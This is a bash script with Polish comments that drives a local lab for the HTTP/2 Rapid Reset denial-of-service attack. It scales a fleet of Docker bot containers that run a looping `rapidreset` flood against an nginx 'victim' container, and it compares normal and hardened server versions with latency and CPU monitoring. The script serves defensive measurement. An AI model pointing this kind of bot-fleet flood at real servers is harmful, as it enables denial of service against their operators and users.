#!/usr/bin/env bash
# =============================================================================
# control.sh - centralny, interaktywny sterownik labu HTTP/2 Rapid Reset.
#
# Bez GUI, bez batcha "wszystko naraz". Odpalasz raz, dostajesz zywa konsole i
# RECZNIE manipulujesz: wybierasz wariant serwera, dynamicznie zwiekszasz /
# zmniejszasz flote botow, wlaczasz/wylaczasz atak - a efekt obserwujesz na
# zywo (czas odpowiedzi w terminalu z sondy + metryki serwera w Zabbixie).
#
# IZOLACJA RDZENI (naprawia dziwne wykresy "wiecej botow = mniej CPU"):
#   victim -> rdzenie 0,1   (saturowalne, widac degradacje)
#   sonda  -> rdzen 2       (pomiar latencji NIE zaglodzony = wiarygodny)
#   flota  -> rdzenie 3-11  (napor, nie podkrada CPU ofierze ani sondzie)
#
# GRANICA: flota to z gory zbudowane kontenery tego labu (rapidreset/h2load
# wbudowane w obraz). Sterownik nimi dyryguje - niczego nie wgrywa na zewnatrz.
#
# Uzycie:
#   bash scenarios/control.sh            # tryb interaktywny (menu)
#   bash scenarios/control.sh <komenda>  # pojedyncza komenda (do skryptow/testow)
#
# Komendy (w menu wpisujesz bez 'control.sh'):
#   up                      zbuduj+postaw stos (victim+Zabbix+sonda), sprowizjonuj Zabbix
#   variant <v>             przelacz serwer: old-normal | old-hardened | new-normal | new-hardened
#   scale <N>               ustaw flote na dokladnie N botow (dynamicznie w gore/dol)
#   attack                  odpal Rapid Reset na calej flocie (ciagly, do 'stop')
#   legit                   odpal ruch h2load (kompletne zadania) zamiast ataku
#   stop                    zatrzymaj ruch floty
#   status                  wariant, liczba botow, CPU ofiary, ostatni pomiar sondy
#   probe [N]               pokaz ostatnie N (domyslnie 12) pomiarow latencji sondy
#   zabbix                  wypisz link do Zabbixa
#   down                    zdejmij flote (stos zostaje); 'down all' zdejmuje wszystko
#   help                    ta pomoc
#   quit                    wyjscie (stos i flota zostaja dzialajace)
# =============================================================================
set -u
export MSYS_NO_PATHCONV=1 2>/dev/null || true
export MSYS2_ARG_CONV_EXCL='*' 2>/dev/null || true

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"

FILES=(-f docker-compose.yml -f docker-compose.monitoring.yml -f docker-compose.labvic.yml -f docker-compose.probe.yml)
LABNET="ddos-lab_labnet"
FLEET_IMAGE="lab-fleetbot:latest"
FLEET_CPUSET="3-11"
FLEET_CPUS="${FLEET_CPUS:-0.3}"
ZABBIX_URL="http://localhost:8080"
LIVE_DIR="$ROOT/lab-results/live"
STATE="$LIVE_DIR/.state"
PROBE_CSV="$LIVE_DIR/probe.csv"
mkdir -p "$LIVE_DIR"

C_G='\033[32m'; C_R='\033[31m'; C_Y='\033[33m'; C_B='\033[36m'; C_0='\033[0m'

dc() { docker compose "${FILES[@]}" "$@"; }

state_get() { [ -f "$STATE" ] && grep "^$1=" "$STATE" | tail -1 | cut -d= -f2- || echo ""; }
state_set() {  # key value
  mkdir -p "$LIVE_DIR"
  if [ -f "$STATE" ] && grep -q "^$1=" "$STATE"; then
    sed -i "s|^$1=.*|$1=$2|" "$STATE"
  else
    echo "$1=$2" >> "$STATE"
  fi
}

variant_env() {  # echo "NGINX_OLD VICTIM_MODE" dla nazwy wariantu
  case "$1" in
    old-normal)   echo "1.25.1-alpine normal"   ;;
    old-hardened) echo "1.25.1-alpine hardened" ;;
    new-normal)   echo "1.27-alpine normal"     ;;
    new-hardened) echo "1.27-alpine hardened"   ;;
    *) return 1 ;;
  esac
}

wait_victim() {
  local i=0
  while [ $i -lt 40 ]; do
    docker run --rm --network "$LABNET" curlimages/curl:8.8.0 -sk --max-time 2 https://victim/ -o /dev/null 2>/dev/null && return 0
    # fallback: przez istniejacy kontener probe, jesli jest
    docker exec lab-probe sh -c 'vegeta --version >/dev/null 2>&1' 2>/dev/null
    i=$((i+1)); sleep 1
  done
  return 1
}

# ---------- fleet ----------
fleet_names() { docker ps --filter label=lab-fbot=1 --format '{{.Names}}' 2>/dev/null; }
fleet_count() { fleet_names | grep -c . || true; }
present_idx()  { fleet_names | sed -n 's/^lab-fbot-\([0-9]*\)$/\1/p' | sort -n; }

ensure_fleet_image() {
  docker image inspect "$FLEET_IMAGE" >/dev/null 2>&1 && return 0
  echo "[*] Buduje obraz floty ($FLEET_IMAGE) z ./bot ..."
  docker build -q -t "$FLEET_IMAGE" ./bot >/dev/null
}

create_bot() {
  docker rm -f "lab-fbot-$1" >/dev/null 2>&1
  docker run -d --name "lab-fbot-$1" --label lab-fbot=1 --init \
    --network "$LABNET" --cpuset-cpus "$FLEET_CPUSET" --cpus "$FLEET_CPUS" \
    "$FLEET_IMAGE" >/dev/null
}

# Zatrzymanie ruchu: ubij wszystko poza PID1(docker-init), sleep(keepalive) i soba.
_KILL='for d in /proc/[0-9]*; do p=${d#/proc/}; [ "$p" = "1" ] && continue; [ "$p" = "$$" ] && continue; c=$(cat "$d/comm" 2>/dev/null); [ "$c" = "sleep" ] && continue; [ "$c" = "docker-init" ] && continue; kill -9 "$p" 2>/dev/null; done; exit 0'

cmd_scale() {
  local n="${1:-}"
  case "$n" in ''|*[!0-9]*) echo "uzycie: scale <liczba>"; return 1 ;; esac
  ensure_fleet_image
  local present; present="$(present_idx)"
  echo "[*] Skaluje flote do $n botow (cpuset $FLEET_CPUSET, $FLEET_CPUS CPU/bot) ..."
  local i
  for i in $(seq 1 "$n"); do
    echo "$present" | grep -qx "$i" || create_bot "$i"
  done
  for i in $present; do
    [ "$i" -gt "$n" ] && docker rm -f "lab-fbot-$i" >/dev/null 2>&1
  done
  local mode; mode="$(state_get attack_mode)"
  echo -e "[*] Flota: $(fleet_count) botow.$([ -n "$mode" ] && echo " Ruch '$mode' trwa - nowe boty dozbrajam..." )"
  # jesli atak trwa, dozbroj wszystkie (idempotentnie)
  [ -n "$mode" ] && cmd_fire "$mode"
  return 0
}

cmd_fire() {  # $1 = attack|legit
  local mode="$1"
  local names; names="$(fleet_names)"
  [ -z "$names" ] && { echo "[!] Brak botow - najpierw 'scale <N>'"; return 1; }
  local single
  if [ "$mode" = "attack" ]; then
    single='rapidreset -url https://victim:443 -requests 20000 -concurrency 200 -quiet >/dev/null 2>&1'
  else
    single='h2load -n 20000 -c 200 https://victim/ >/dev/null 2>&1'
  fi
  local loop="while true; do $single; done"
  local cid
  for cid in $names; do
    docker exec "$cid" sh -c "$_KILL" >/dev/null 2>&1   # najpierw czysto
    docker exec -d "$cid" sh -c "$loop"
  done
  state_set attack_mode "$mode"
  echo -e "${C_R}[*] Ruch '$mode' odpalony na $(echo "$names" | grep -c .) botach (ciagly).${C_0} Zatrzymasz przez 'stop'."
}

cmd_stop() {
  local names; names="$(fleet_names)"
  [ -z "$names" ] && { echo "[!] Brak botow."; return 0; }
  local cid
  for cid in $names; do docker exec "$cid" sh -c "$_KILL" >/dev/null 2>&1; done
  state_set attack_mode ""
  echo -e "${C_G}[*] Ruch zatrzymany na wszystkich botach.${C_0}"
}

cmd_variant() {
  local v="${1:-}"
  local env; env="$(variant_env "$v")" || { echo "nieznany wariant: $v (old-normal|old-hardened|new-normal|new-hardened)"; return 1; }
  local ver mode; ver="${env% *}"; mode="${env#* }"
  echo "[*] Przelaczam victim na '$v' (nginx $ver, tryb $mode) - przebudowa..."
  NGINX_OLD="$ver" VICTIM_MODE="$mode" VIC_CPUS=2 dc up -d --build --force-recreate victim >/dev/null 2>&1
  state_set variant "$v"
  echo "[*] victim przebudowany. Czekam na HTTP/2..."
  wait_victim && echo -e "${C_G}[*] victim '$v' gotowy.${C_0}" || echo -e "${C_Y}[!] victim nie odpowiedzial w czasie - sprawdz 'docker logs lab-victim'.${C_0}"
}

cmd_up() {
  ensure_fleet_image
  local v; v="$(state_get variant)"; [ -z "$v" ] && v="old-normal"
  local env; env="$(variant_env "$v")"; local ver mode; ver="${env% *}"; mode="${env#* }"
  echo "[*] Stawiam stos: victim ($v) + Zabbix + sonda. Pierwszy raz = build, chwile potrwa..."
  NGINX_OLD="$ver" VICTIM_MODE="$mode" VIC_CPUS=2 dc up -d --build victim zabbix-db zabbix-server zabbix-web probe
  state_set variant "$v"
  echo "[*] Czekam na victim..."
  wait_victim || echo -e "${C_Y}[!] victim wolno wstaje - kontynuuje.${C_0}"
  echo "[*] Provisioning Zabbix (host victim + szablony)..."
  dc run --rm zabbix-provision 2>&1 | tail -3
  echo -e "${C_G}[*] Gotowe.${C_0} Zabbix: $ZABBIX_URL (Admin/zabbix). Sonda w tle (docker logs -f lab-probe)."
}

cmd_status() {
  local v bots mode cpu last
  v="$(state_get variant)"; [ -z "$v" ] && v="(nieustawiony)"
  bots="$(fleet_count)"
  mode="$(state_get attack_mode)"; [ -z "$mode" ] && mode="bezczynny"
  cpu="$(docker stats --no-stream --format '{{.CPUPerc}}' lab-victim 2>/dev/null || echo '?')"
  echo "-------------------------------------------"
  echo -e " wariant serwera : ${C_B}$v${C_0}"
  echo -e " boty we flocie  : ${C_B}$bots${C_0}"
  echo -e " ruch floty      : $([ "$mode" = bezczynny ] && echo "${C_G}$mode${C_0}" || echo "${C_R}$mode${C_0}")"
  echo -e " CPU victim      : ${C_B}$cpu${C_0}  (budzet: 2 rdzenie = max 200%)"
  if [ -f "$PROBE_CSV" ]; then
    last="$(tail -1 "$PROBE_CSV")"
    echo " sonda (ostatni) : $(echo "$last" | awk -F, '{printf "p95=%sms success=%s%% rps=%s @ %s", $4,$7,$8,$2}')"
  else
    echo " sonda           : (brak danych - czy 'up' postawil probe?)"
  fi
  echo "-------------------------------------------"
}

cmd_probe() {
  local n="${1:-12}"
  [ -f "$PROBE_CSV" ] || { echo "brak $PROBE_CSV (postaw stos: 'up')"; return 1; }
  echo "czas     p50     p95      p99      success  rps   (ostatnie $n okien)"
  tail -n "$n" "$PROBE_CSV" | awk -F, 'NR>=1{printf "%-8s %-7s %-8s %-8s %-7s%% %-6s\n",$2,$3,$4,$5,$7,$8}'
}

cmd_down() {
  echo "[*] Zdejmuje flote..."
  docker ps -aq --filter label=lab-fbot=1 | xargs -r docker rm -f >/dev/null 2>&1
  state_set attack_mode ""
  if [ "${1:-}" = "all" ]; then
    echo "[*] Zdejmuje caly stos (victim/Zabbix/sonda)..."
    dc down >/dev/null 2>&1
  fi
  echo "[*] Gotowe."
}

dispatch() {
  case "${1:-help}" in
    up)      cmd_up ;;
    variant) cmd_variant "${2:-}" ;;
    scale)   cmd_scale "${2:-}" ;;
    attack)  cmd_fire attack ;;
    legit)   cmd_fire legit ;;
    stop)    cmd_stop ;;
    status)  cmd_status ;;
    probe)   cmd_probe "${2:-12}" ;;
    zabbix)  echo "$ZABBIX_URL  (Admin/zabbix) -> Monitoring -> Latest data -> host victim" ;;
    down)    cmd_down "${2:-}" ;;
    help|'') sed -n '32,50p' "$0" | sed 's/^#\s\?//' ;;
    quit|exit) return 9 ;;
    *) echo "nieznana komenda: $1 (wpisz 'help')" ;;
  esac
}

# --- tryb jednokomendowy (do testow/skryptow) ---
if [ $# -gt 0 ]; then
  dispatch "$@"
  exit $?
fi

# --- tryb interaktywny (menu) ---
echo -e "${C_B}=== Lab HTTP/2 Rapid Reset - sterownik ===${C_0}"
echo "Wpisz 'up' aby postawic stos, potem 'variant', 'scale', 'attack'/'legit', 'stop', 'status'."
echo "Obserwuj: czas odpowiedzi w 'status'/'probe' + metryki serwera w Zabbixie ($ZABBIX_URL)."
echo "'help' = pelna lista, 'quit' = wyjscie (stos zostaje)."
cmd_status 2>/dev/null
while true; do
  printf "${C_B}lab>${C_0} "
  read -r a b c || break
  dispatch "$a" "$b" "$c"; rc=$?
  [ "$rc" = "9" ] && { echo "pa (stos i flota dzialaja dalej; 'down all' aby zdjac)"; break; }
done
